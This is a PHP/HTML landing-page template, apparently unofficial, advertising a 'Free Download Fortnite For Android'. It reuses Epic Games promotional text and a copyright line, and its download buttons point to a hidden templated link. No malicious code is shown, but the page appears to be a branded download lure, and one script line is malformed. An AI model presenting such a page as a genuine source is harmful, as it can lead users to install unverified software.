cubic-bezier(.25,.1,0,1);text-decoration-line:inherit;text-transform:inherit;-webkit-text-decoration-line:inherit}.ladi-spin-lucky .ladi-spin-lucky-screen:before{background-size:cover;background-position:center center;background-repeat:no-repeat;content:'';position:absolute;width:100%;height:100%;top:0;left:0;pointer-events:none}.ladi-spin-lucky .ladi-spin-lucky-label{position:absolute;top:50%;left:50%;overflow:hidden;width:42%;padding-left:12%;transform-origin:0 0;-webkit-transform-origin:0 0;text-decoration-line:inherit;text-transform:inherit;-webkit-text-decoration-line:inherit;line-height:1.6;text-shadow:rgba(0,0,0,.5) 1px 0 2px}
	</style>
	<style id="style_page" type="text/css">
		.ladi-wraper {margin: 0 auto; width: 420px;}body {font-family: "Open Sans", sans-serif}
	</style>
	<style id="style_element" type="text/css">
		#SECTION_POPUP { height: 0px;}#SECTION10 { height: 742.2px;}#SECTION10 > .ladi-section-background { background: #004e92; background: -webkit-linear-gradient(180deg, #004e92, #000428); background: linear-gradient(180deg, #004e92, #000428);}#HEADLINE11 { width: 399px;top: 64px;left: 10.5px;}#HEADLINE11 > .ladi-headline { font-family: "Roboto", sans-serif;color: rgb(255, 255, 255); font-size: 15px; text-align: left; line-height: 1.6;}#SECTION12 { height: 2725px;}#GALLERY13 { width: 400px;height: 225px;top: 364px;left: 11px;}#GALLERY13 > .ladi-gallery > .ladi-gallery-view {height: calc(100% - 0px);}#GALLERY13 > .ladi-gallery > .ladi-gallery-control {height: 0px;display: none;}#GALLERY13 > .ladi-gallery > .ladi-gallery-control > .ladi-gallery-control-box > .ladi-gallery-control-item {width: 0px;height: 0px;margin-right: 0px;}#GALLERY13 .ladi-gallery .ladi-gallery-view-item[data-index="0"] {background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/1-20200904072218.jpg");}#GALLERY13 .ladi-gallery .ladi-gallery-control-item[data-index="0"] {background-image: url("https://w.ladicdn.com/s400x400/58fce0433a617d2d7d843a28/1-20200904072218.jpg");}#GALLERY13 .ladi-gallery .ladi-gallery-view-item[data-index="1"] {background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/2-20200904072218.jpg");}#GALLERY13 .ladi-gallery .ladi-gallery-control-item[data-index="1"] {background-image: url("https://w.ladicdn.com/s400x400/58fce0433a617d2d7d843a28/2-20200904072218.jpg");}#GALLERY13 .ladi-gallery .ladi-gallery-view-item[data-index="2"] {background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/3-20200904072218.jpg");}#GALLERY13 .ladi-gallery .ladi-gallery-control-item[data-index="2"] {background-image: url("https://w.ladicdn.com/s400x400/58fce0433a617d2d7d843a28/3-20200904072218.jpg");}#GALLERY13 .ladi-gallery .ladi-gallery-view-item[data-index="3"] {background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/4-20200904072218.jpg");}#GALLERY13 .ladi-gallery .ladi-gallery-control-item[data-index="3"] {background-image: url("https://w.ladicdn.com/s400x400/58fce0433a617d2d7d843a28/4-20200904072218.jpg");}#HEADLINE15 { width: 420px;top: 10px;left: 0px;}#HEADLINE15 > .ladi-headline { font-family: "Sriracha", cursive;color: rgb(255, 255, 255); font-size: 34px; text-align: center; line-height: 1.6; text-shadow: rgb(18, 11, 92) 1px 2px 3px; -webkit-text-stroke: 0px rgb(255, 255, 255);}#HEADLINE16 { width: 399px;top: 606px;left: 11px;}#HEADLINE16 > .ladi-headline { font-family: "Roboto", sans-serif;color: rgb(255, 255, 255); font-size: 15px; text-align: left; line-height: 1.6;}#HEADLINE17 { width: 420px;top: 0px;left: 0px;}#HEADLINE17 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(255, 64, 54); font-size: 34px; text-align: center; line-height: 1.6;}#HEADLINE26 { width: 420px;top: 0px;left: 0px;}#HEADLINE26 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(48, 202, 232); font-size: 23px; text-align: center; line-height: 1.6;}#HEADLINE27 { width: 399px;top: 36px;left: 11px;}#HEADLINE27 > .ladi-headline { font-family: "Roboto", sans-serif;color: rgb(0, 0, 0); font-size: 15px; text-align: center; line-height: 1.6;}#HEADLINE28 { width: 420px;top: 0px;left: 0px;}#HEADLINE28 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(48, 202, 232); font-size: 23px; text-align: center; line-height: 1.6;}#HEADLINE29 { width: 399px;top: 36px;left: 10.5px;}#HEADLINE29 > .ladi-headline { font-family: "Roboto", sans-serif;color: rgb(0, 0, 0); font-size: 15px; text-align: center; line-height: 1.6;}#HEADLINE30 { width: 420px;top: 0px;left: 0px;}#HEADLINE30 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(48, 202, 232); font-size: 23px; text-align: center; line-height: 1.6;}#HEADLINE31 { width: 399px;top: 36px;left: 10px;}#HEADLINE31 > .ladi-headline { font-family: "Roboto", sans-serif;color: rgb(0, 0, 0); font-size: 15px; text-align: center; line-height: 1.6;}#GROUP32 { width: 420px;height: 178px;top: 1054.3px;left: 0.5px;}#GROUP33 { width: 420px;height: 155px;top: 658.841px;left: 0.5px;}#GROUP34 { width: 420px;height: 155px;top: 264px;left: 0.5px;}#HEADLINE36 { width: 420px;top: 0px;left: 0px;}#HEADLINE36 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(48, 202, 232); font-size: 23px; text-align: center; line-height: 1.6;}#HEADLINE37 { width: 399px;top: 36px;left: 10px;}#HEADLINE37 > .ladi-headline { font-family: "Roboto", sans-serif;color: rgb(0, 0, 0); font-size: 15px; text-align: center; line-height: 1.6;}#GROUP35 { width: 420px;height: 178px;top: 1471.5px;left: 0.5px;}#BUTTON_TEXT45 { width: 168px;top: 9px;left: 0px;}#BUTTON_TEXT45 > .ladi-headline { color: rgb(255, 255, 255); font-size: 19px; text-align: center; line-height: 1.6;}#BUTTON45 { width: 168px;height: 45px;top: 2652.75px;left: 125.5px;}#BUTTON45 > .ladi-button > .ladi-button-background { background: rgba(0, 0, 0, 1.0); background: -webkit-linear-gradient(180deg, rgba(0, 0, 0, 1.0), rgba(102, 162, 238, 1.0)); background: linear-gradient(180deg, rgba(0, 0, 0, 1.0), rgba(102, 162, 238, 1.0));}#BUTTON45 > .ladi-button { border-style: solid; border-color: rgb(201, 31, 23); border-width: 1px; border-radius: 10px;}#HEADLINE49 { width: 420px;top: 36px;left: 0px;}#HEADLINE49 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(200, 31, 23); font-size: 23px; text-align: center; line-height: 1.6;}#SECTION51 { height: 106px;}#SECTION51 > .ladi-section-background { background-color: rgb(84, 84, 84);}#SECTION1 { height: 585px;}#SECTION1 > .ladi-section-background { background-size: cover; background-attachment: scroll; background-origin: content-box; background-image: url("https://w.ladicdn.com/s768x585/58fce0433a617d2d7d843a28/2-20201208081325.jpg"); background-position: center top; background-repeat: repeat;}#HEADLINE4 { width: 420px;top: 300.57px;left: 0px;}#HEADLINE4 > .ladi-headline { font-family: "Paytone One", sans-serif;background: #000428; background: -webkit-radial-gradient(circle, #000428, #004e92); background: radial-gradient(circle, #000428, #004e92);color: rgb(0, 0, 0); font-size: 50px; text-align: center; line-height: 1.6;}#HEADLINE4 .ladi-headline {-webkit-background-clip: text;-webkit-text-fill-color: transparent;}#HEADLINE5 { width: 420px;top: 271.57px;left: 0px;}#HEADLINE5 > .ladi-headline { font-family: "Bungee Inline", cursive;color: rgb(0, 0, 0); font-size: 25px; text-align: center; line-height: 1.6;}#BUTTON6 { width: 168px;height: 47px;top: 390.57px;left: 126px;}#BUTTON6 > .ladi-button > .ladi-button-background { background-color: rgb(0, 0, 0);}#BUTTON6 > .ladi-button { box-shadow: 0px 15px 20px -15px #000; -webkit-box-shadow: 0px 15px 20px -15px #000; border-color: rgb(255, 255, 255); border-width: 1px; border-radius: 10px;}#BUTTON_TEXT6 { width: 168px;top: 9px;left: 0px;}#BUTTON_TEXT6 > .ladi-headline { color: rgb(255, 255, 255); font-size: 19px; text-align: center; line-height: 1.6;}#HEADLINE7 { width: 411px;top: 453.57px;left: 4.5px;}#HEADLINE7 > .ladi-headline { font-family: "Bungee Inline", cursive;color: rgb(0, 0, 0); font-size: 27px; text-align: center; line-height: 1.6;}#SECTION55 { height: 79.57px;}#SECTION55 > .ladi-section-background { background-color: rgb(0, 0, 0);}#IMAGE58 { width: 60px;height: 60px;top: 9.785px;left: 17px;}#IMAGE58 > .ladi-image > .ladi-image-background { width: 60px;height: 60px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s400x400/58fce0433a617d2d7d843a28/5-1-20201208084405.jpg");}#IMAGE59 { width: 60px;height: 60px;top: 9.785px;left: 333px;}#IMAGE59 > .ladi-image > .ladi-image-background { width: 60px;height: 60px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s400x400/58fce0433a617d2d7d843a28/logo-2-1-20201208084405.jpg");}#IMAGE59 > .ladi-image { border-radius: 10px;}#IMAGE60 { width: 187px;height: 60px;top: 9.785px;left: 110.5px;}#IMAGE60 > .ladi-image > .ladi-image-background { width: 187px;height: 60px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s500x400/58fce0433a617d2d7d843a28/6-1-20201208084558.png");}#IMAGE61 { width: 400px;height: 200.001px;top: 54px;left: 11px;}#IMAGE61 > .ladi-image > .ladi-image-background { width: 400px;height: 200.001px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/10-20201208085057.jpg");}#IMAGE62 { width: 400px;height: 200px;top: 833.841px;left: 10.5px;}#IMAGE62 > .ladi-image > .ladi-image-background { width: 400px;height: 200px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/12-20201208085302.jpg");}#IMAGE63 { width: 400px;height: 200px;top: 439px;left: 10.5px;}#IMAGE63 > .ladi-image > .ladi-image-background { width: 400px;height: 200px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/11-20201208085302.jpg");}#IMAGE64 { width: 400px;height: 200px;top: 1252.17px;left: 10.5px;}#IMAGE64 > .ladi-image > .ladi-image-background { width: 400px;height: 200px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/13-20201208085302.jpg");}#HEADLINE42 { width: 420px;top: 0px;left: 0px;}#HEADLINE42 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(200, 31, 23); font-size: 23px; text-align: center; line-height: 1.6;}#IMAGE65 { width: 400px;height: 200px;top: 1669.17px;left: 10.5px;}#IMAGE65 > .ladi-image > .ladi-image-background { width: 400px;height: 200px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/14-20201208085302.jpg");}#HEADLINE72 { width: 420px;top: 0px;left: 0px;}#HEADLINE72 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(48, 202, 232); font-size: 23px; text-align: center; line-height: 1.6;}#HEADLINE73 { width: 399px;top: 36px;left: 10px;}#HEADLINE73 > .ladi-headline { font-family: "Roboto", sans-serif;color: rgb(0, 0, 0); font-size: 15px; text-align: center; line-height: 1.6;}#GROUP71 { width: 420px;height: 226px;top: 1888.75px;left: -0.5px;}#IMAGE74 { width: 400px;height: 200px;top: 2134.51px;left: 9.5px;}#IMAGE74 > .ladi-image > .ladi-image-background { width: 400px;height: 200px;top: 0px;left: 0px;background-image: url("https://w.ladicdn.com/s750x550/58fce0433a617d2d7d843a28/15-20201208085302.jpg");}#HEADLINE76 { width: 420px;top: 0px;left: 0px;}#HEADLINE76 > .ladi-headline { font-family: "Paytone One", sans-serif;color: rgb(48, 202, 232); font-size: 23px; text-align: center; line-height: 1.6;}#HEADLINE77 { width: 399px;top: 36px;left: 10px;}#HEADLINE77 > .ladi-headline { font-family: "Roboto", sans-serif;color: rgb(0, 0, 0); font-size: 15px; text-align: center; line-height: 1.6;}#GROUP75 { width: 420px;height: 155px;top: 2353.75px;left: 0px;}#GROUP79 { width: 420px;height: 109px;top: 2528.75px;left: 0px;}#PARAGRAPH80 { width: 400px;top: 8.75px;left: 9.5px;}#PARAGRAPH80 > .ladi-paragraph { opacity: 0.6; color: rgb(255, 255, 255); font-size: 13px; line-height: 1.6;}
	</style>
	<style id="style_lazyload" type="text/css">
		.ladi-section-background, .ladi-image-background, .ladi-button-background, .ladi-headline, .ladi-video-background, .ladi-countdown-background, .ladi-box, .ladi-frame-background, .ladi-banner, .ladi-form-item-background, .ladi-gallery-view-item, .ladi-gallery-control-item, .ladi-spin-lucky-screen, .ladi-spin-lucky-start, .ladi-list-paragraph ul li:before {background-image: none !important;}
	</style>
<?php echo $fullCodeHeader; ?>
</head>

<body>
<?php echo getTagManagerFullBodyCode(); ?>
	<div class="ladi-wraper">
		<div id="SECTION55" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container">
				<div id="IMAGE59" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="IMAGE58" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="IMAGE60" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
			</div>
		</div>
		<div id="SECTION1" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container">
				<div id="HEADLINE4" class='ladi-element'>
					<h3 class='ladi-headline'><span style="font-weight: bold;">ZERO POINT</span><br></h3>
				</div>
				<div id="HEADLINE5" class='ladi-element'>
					<h3 class='ladi-headline'><span style="font-weight: bold;">CHAPER 2 - SEASON 5</span><br></h3>
				</div>
				<a href="<?php echo $link; ?>" id="BUTTON6" class='ladi-element link_download'>
					<div class='ladi-button'>
						<div class="ladi-button-background"></div>
						<div id="BUTTON_TEXT6" class='ladi-element'>
							<p class='ladi-headline'><span style="font-weight: bold;">DOWNLOAD</span>
							</p>
						</div>
					</div>
				</a>
				<div id="HEADLINE7" class='ladi-element'>
					<h3 class='ladi-headline'><span style="font-weight: bold;">Free Download Fortnite For Android&nbsp;<br></span></h3>
				</div>
			</div>
		</div>
		<div id="SECTION10" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container">
				<div id="HEADLINE11" class='ladi-element'>
					<h3 class='ladi-headline'>Fortnite is the free battle royale game that took the world by storm and became a cultural marvel. Fortnite is a world of many experiences. Drop onto the Island and compete to be the last player — or team — standing. Hang out with friends to catch a concert or a movie. Create a world of your own with your own rules. Or Save the World by taking down hordes of monsters with others.<br><br>There are four major game modes in Fortnite, together offering something for every kind of player. These four modes are: Battle Royale, Party Royale, Creative, and Save the World.&nbsp;<br></h3>
				</div>
				<div id="HEADLINE15" class='ladi-element'>
					<h3 class='ladi-headline'><span style="font-weight: bold;">WHAT IS FORTNITE?<br></span></h3>
				</div>
				<div id="HEADLINE16" class='ladi-element'>
					<h3 class='ladi-headline'>Millions of players around the world play Fortnite, ensuring there are always players to join up with — whether you’re outlasting them in Battle Royale, trying out games with them in Creative, or taking down Husks together in Save the World.<br></h3>
				</div>
				<div id="GALLERY13" class='ladi-element'>
					<div class='ladi-gallery ladi-gallery-bottom'>
						<div class="ladi-gallery-view">
							<div class="ladi-gallery-view-arrow ladi-gallery-view-arrow-left"></div>
							<div class="ladi-gallery-view-arrow ladi-gallery-view-arrow-right"></div>
							<div class="ladi-gallery-view-item selected" data-index="0"></div>
							<div class="ladi-gallery-view-item" data-index="1"></div>
							<div class="ladi-gallery-view-item" data-index="2"></div>
							<div class="ladi-gallery-view-item" data-index="3"></div>
						</div>
						<div class="ladi-gallery-control">
							<div class="ladi-gallery-control-box">
								<div class="ladi-gallery-control-item selected" data-index="0"></div>
								<div class="ladi-gallery-control-item" data-index="1"></div>
								<div class="ladi-gallery-control-item" data-index="2"></div>
								<div class="ladi-gallery-control-item" data-index="3"></div>
							</div>
							<div class="ladi-gallery-control-arrow ladi-gallery-control-arrow-left"></div>
							<div class="ladi-gallery-control-arrow ladi-gallery-control-arrow-right"></div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="SECTION12" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container">
				<div id="HEADLINE17" class='ladi-element'>
					<h3 class='ladi-headline'><span style="font-weight: bold;">CHAPER 2 SEASON 5<br></span></h3>
				</div>
				<div id="GROUP34" class='ladi-element'>
					<div class='ladi-group'>
						<div id="HEADLINE26" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: bold;">THE HUNT IS ON<br></span></h3>
						</div>
						<div id="HEADLINE27" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: 700;">THE ZERO POINT IS EXPOSED, BUT NO ONE ESCAPES THE LOOP, NOT ON YOUR WATCH. JOIN AGENT JONES AND THE GREATEST HUNTERS FROM ACROSS REALITIES LIKE THE MANDALORIAN IN A CHAOTIC BATTLE THAT WILL SHAPE THE FUTURE OF THE ISLAND...</span><br></h3>
						</div>
					</div>
				</div>
				<div id="IMAGE61" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="IMAGE63" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="GROUP33" class='ladi-element'>
					<div class='ladi-group'>
						<div id="HEADLINE28" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: bold;">NEW HUNTING GROUNDS
<br><br></span></h3>
						</div>
						<div id="HEADLINE29" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: 700;">NEW HUNTERS MEANS NEW LOCATIONS FROM BEYOND THE LOOP. BATTLE FOR HONOR IN AN ANCIENT ARENA, SHARPEN YOUR SURVIVAL SKILLS IN THE JUNGLE, AND EXPLORE THE SHIFTING CRYSTALLINE SANDS FLOWING FROM THE EXPOSED ZERO POINT.</span><br></h3>
						</div>
					</div>
				</div>
				<div id="IMAGE62" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="GROUP32" class='ladi-element'>
					<div class='ladi-group'>
						<div id="HEADLINE30" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: bold;">HELP FOR HIRE<br></span></h3>
						</div>
						<div id="HEADLINE31" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: 700;">AS A HUNTER, IT’S YOUR DUTY TO HELP THE ISLAND’S CHARACTERS IN THEIR UNSTABLE NEW REALITY. TAKE ON THEIR QUESTS AND BOUNTIES, GET INTEL ON YOUR SURROUNDINGS, OR HIRE THEM TO BE YOUR ALLY. DON’T WANT TO NEGOTIATE? CHALLENGE THEM TO A DUEL AND REAP THE REWARDS.</span><br></h3>
						</div>
					</div>
				</div>
				<div id="GROUP35" class='ladi-element'>
					<div class='ladi-group'>
						<div id="HEADLINE36" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: bold;">SPEND YOUR WAGES<br></span></h3>
						</div>
						<div id="HEADLINE37" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: 700;">THE NEW CHARACTERS ONLY ACCEPT ONE FORM OF PAYMENT: BARS! EARN BARS BY COMPLETING QUESTS AND BOUNTIES, ELIMINATING PLAYERS, OR FINDING HIDDEN STASHES AROUND THE ISLAND. SPEND YOUR EARNED BARS ON NEW EXOTIC WEAPONS, UPGRADES, INTEL, SERVICES AND MORE.</span><br></h3>
						</div>
					</div>
				</div>
				<div id="IMAGE64" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="IMAGE65" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="GROUP71" class='ladi-element'>
					<div class='ladi-group'>
						<div id="HEADLINE72" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: bold;">NEW WEAPONS, NEW TRICKS<br></span></h3>
						</div>
						<div id="HEADLINE73" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: 700;">NEW WEAPONS LET YOU ATTACK IN NOVEL WAYS. UNLEASH YOUR FIERY RAGE WITH THE DRAGON’S BREATH SHOTGUN, SWITCH BETWEEN MELEE AND RANGED WITH THE MANDALORIAN’S AMBAN SNIPER RIFLE, TRACK YOUR TARGET WITH THE NIGHT HAWK, AND MORE. HUNTERS AND VENDORS ARE ALSO WORKING TO BRING YOU MORE WEAPONS THROUGHOUT THE SEASON, SO KEEP AN EYE OUT!</span><br></h3>
						</div>
					</div>
				</div>
				<div id="IMAGE74" class='ladi-element'>
					<div class='ladi-image'>
						<div class="ladi-image-background"></div>
					</div>
				</div>
				<div id="GROUP75" class='ladi-element'>
					<div class='ladi-group'>
						<div id="HEADLINE76" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: bold;">WHO’S NEXT?<br></span></h3>
						</div>
						<div id="HEADLINE77" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: 700;">THE HUNTERS ON THE ISLAND ARE ONLY THE FIRST TO ARRIVE FROM OUTSIDE THE LOOP... THROUGHOUT THE SEASON, AGENT JONES WILL BRING IN EVEN MORE HUNTERS FROM THE REALITIES BEYOND. WHO WILL BE NEXT?
</span><br></h3>
						</div>
					</div>
				</div>
				<a href="<?php echo $link; ?>" id="BUTTON45" class='ladi-element link_download'>
					<div class='ladi-button'>
						<div class="ladi-button-background"></div>
						<div id="BUTTON_TEXT45" class='ladi-element'>
							<p class='ladi-headline'><span style="font-weight: bold;">DOWNLOAD</span>
							</p>
						</div>
					</div>
				</a>
				<div id="GROUP79" class='ladi-element'>
					<div class='ladi-group'>
						<div id="HEADLINE42" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: bold;">BATTLE PASS - ZERO POINT<br></span></h3>
						</div>
						<div id="HEADLINE49" class='ladi-element'>
							<h3 class='ladi-headline'><span style="font-weight: bold;">Download Fortnite For Android Free-To-Play<br></span></h3>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="SECTION51" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container">
				<div id="PARAGRAPH80" class='ladi-element'>
					<p class='ladi-paragraph'>© 2021, Epic Games, Inc. Epic, Epic Games, the Epic Games logo, Fortnite, the Fortnite logo, Unreal, Unreal Engine 4 and UE4 are trademarks or registered trademarks of Epic Games, Inc. in the United States of America and elsewhere. All rights reserved.</p>
				</div>
			</div>
		</div>
		<div id="SECTION_POPUP" class='ladi-section'>
			<div class='ladi-section-background'></div>
			<div class="ladi-container"></div>
		</div>
	</div>
	<div id="backdrop-popup" class="backdrop-popup"></div>
	<div id="lightbox-screen" class="lightbox-screen"></div>
	<script id="script_lazyload" type="text/javascript">
		(function () {var list_element_lazyload = document.querySelectorAll('.ladi-section-background, .ladi-image-background, .ladi-button-background, .ladi-headline, .ladi-video-background, .ladi-countdown-background, .ladi-box, .ladi-frame-background, .ladi-banner, .ladi-form-item-background, .ladi-gallery-view-item, .ladi-gallery-control-item, .ladi-spin-lucky-screen, .ladi-spin-lucky-start, .ladi-list-paragraph ul li');var style_lazyload = document.getElementById('style_lazyload');for (var i = 0; i < list_element_lazyload.length; i++) {var rect = list_element_lazyload[i].getBoundingClientRect();if (rect.x == "undefined" || rect.x == undefined || rect.y == "undefined" || rect.y == undefined) {rect.x = rect.left;rect.y = rect.top;}var offset_top = rect.y + window.scrollY;if (offset_top >= window.scrollY + window.innerHeight || window.scrollY >= offset_top + list_element_lazyload[i].offsetHeight) {list_element_lazyload[i].classList.add('ladi-lazyload');}}style_lazyload.parentElement.removeChild(style_lazyload);var currentScrollY = window.scrollY;var stopLazyload = function (event) {if (event.type == "scroll" && window.scrollY == currentScrollY) {currentScrollY = -1;return;}window.removeEventListener('scroll', stopLazyload);list_element_lazyload = document.getElementsByClassName('ladi-lazyload');while(list_element_lazyload.length > 0) {list_element_lazyload[0].classList.remove('ladi-lazyload');}};window.addEventListener('scroll', stopLazyload);})();
	</script>
	<!--[if lt IE 9]><script src="https://w.ladicdn.com/v2/source/html5shiv.min.js?v=1612422913124"></script><script src="https://w.ladicdn.com/v2/source/respond.min.js?v=1612422913124"></script><![endif]-->
	<link href="https://fonts.googleapis.com/css?family=Open Sans:bold,regular|Roboto:bold,regular|Sriracha:bold,regular|Paytone One:bold,regular|Bungee Inline:bold,regular&display=swap" rel="stylesheet" type="text/css">
	<link href="https://w.ladicdn.com/v2/source/ladipage.min.css?v=1612422913124" rel="stylesheet" type="text/css">
	<script id='script_viewport' type='text/javascript'>
		window.ladi_viewport = function () {var width = window.outerWidth > 0 ? window.outerWidth : window.screen.width;var widthDevice = width;var is_desktop = width >= 768;var content = "";if (typeof window.ladi_is_desktop == "undefined" || window.ladi_is_desktop == undefined) {window.ladi_is_desktop = is_desktop;}if (!is_desktop) {widthDevice = 420;} else {widthDevice = 960;}content = "width=" + widthDevice + ", user-scalable=yes";var scale = 1;if (!is_desktop && widthDevice != window.screen.width && window.screen.width > 0) {scale = window.screen.width / widthDevice;}if (scale != 1) {content += ", initial-scale=" + scale + ", minimum-scale=" + scale + ", maximum-scale=" 4;}var docViewport = document.getElementById("viewport");if (!docViewport) {docViewport = document.createElement("meta");docViewport.setAttribute("id", "viewport");docViewport.setAttribute("name", "viewport");document.head.appendChild(docViewport);}docViewport.setAttribute("content", content);};window.ladi_viewport();
	</script>
	<script src="https://w.ladicdn.com/v2/source/ladipage.vi.min.js?v=1612422913124" type="text/javascript"></script>
	<script id="script_event_data" type="text/javascript">
		(function () {var run = function () {if (typeof window.LadiPageScript == "undefined" || window.LadiPageScript == undefined || typeof window.ladi == "undefined" || window.ladi == undefined) {setTimeout(run, 100); return;}window.LadiPageApp = window.LadiPageApp || new window.LadiPageAppV2();window.LadiPageScript.runtime.ladipage_id = '6004fdc01cba2c00118c7b18';window.LadiPageScript.runtime.publish_platform = 'LADIPAGE';window.LadiPageScript.runtime.isMobileOnly = true;window.LadiPageScript.runtime.DOMAIN_SET_COOKIE = ["pagedemo.me"];window.LadiPageScript.runtime.DOMAIN_FREE = [];window.LadiPageScript.runtime.bodyFontSize = 12;window.LadiPageScript.runtime.store_id = "58fce0433a617d2d7d843a28";window.LadiPageScript.runtime.time_zone = 7;window.LadiPageScript.runtime.currency = "VND";window.LadiPageScript.runtime.eventData = "%7B%22SECTION_POPUP%22%3A%7B%22type%22%3A%22section%22%2C%22mobile.option.background-style%22%3A%22solid%22%7D%2C%22SECTION10%22%3A%7B%22type%22%3A%22section%22%2C%22mobile.option.background-style%22%3A%22gradient%22%7D%2C%22HEADLINE11%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22SECTION12%22%3A%7B%22type%22%3A%22section%22%2C%22mobile.option.background-style%22%3A%22solid%22%7D%2C%22GALLERY13%22%3A%7B%22type%22%3A%22gallery%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%2C%22mobile.option.gallery_control.autoplay%22%3Atrue%2C%22mobile.option.gallery_control.autoplay_time%22%3A2%7D%2C%22HEADLINE15%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE16%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE17%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE26%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE27%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE28%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE29%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE30%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE31%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE36%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22HEADLINE37%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22BUTTON_TEXT45%22%3A%7B%22type%22%3A%22headline%22%2C%22option.data_setting.sort_name%22%3A%22updated_at%22%2C%22option.data_setting.sort_by%22%3A%22desc%22%7D%2C%22BUTTON45%22%3A%7B%22type%22%3A%22button%22%2C%22option.data_action%22%3A%7B%22type%22%3A%22link%22%2C%22target%22%3A%22_self%22%2C%22action%22%3A%22%3C%3Fphp%20echo%20%24link%3B%20%3F%3E%22%7D%2C%22option.event_custom_script%22%3A%22gtag_report_conversion()%3B%2